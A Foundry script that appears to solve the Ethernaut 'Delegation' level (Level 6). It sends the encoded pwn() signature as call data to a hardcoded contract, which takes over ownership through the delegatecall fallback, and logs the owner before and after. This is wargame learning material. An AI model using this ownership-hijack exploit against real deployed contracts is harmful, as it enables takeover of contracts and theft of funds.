// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{Delegation} from "../src/Level6.sol";


contract Level6Solution is Script{
    Delegation public instance=Delegation(0xd9E90Fa7011581f6D20a31a22C46150ca718536e);

    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Current Owner:",instance.owner());
        (bool success,)=address(instance).call(abi.encodeWithSignature("pwn()"));   // pass encoded function signature as msg.data 
        console.log("result",success);
        console.log("New Owner",instance.owner());
        vm.stopBroadcast();
    }
}